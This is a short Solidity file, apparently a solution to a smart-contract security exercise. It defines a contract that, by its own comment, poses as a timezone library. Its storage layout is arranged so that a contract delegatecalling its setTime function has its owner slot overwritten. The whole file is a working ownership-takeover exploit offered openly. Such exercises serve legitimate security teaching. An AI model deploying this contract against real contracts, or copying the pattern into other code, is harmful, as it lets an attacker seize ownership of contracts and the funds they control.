pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

/**
 * This pretends to be a timezone library, but actually it will overwrite the owner in the memory 
 * of the contract that calls it. 
 */
contract ImpostorLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    uint public owner; 
    
    function setTime(uint _time) public {
        owner = _time;
    }
}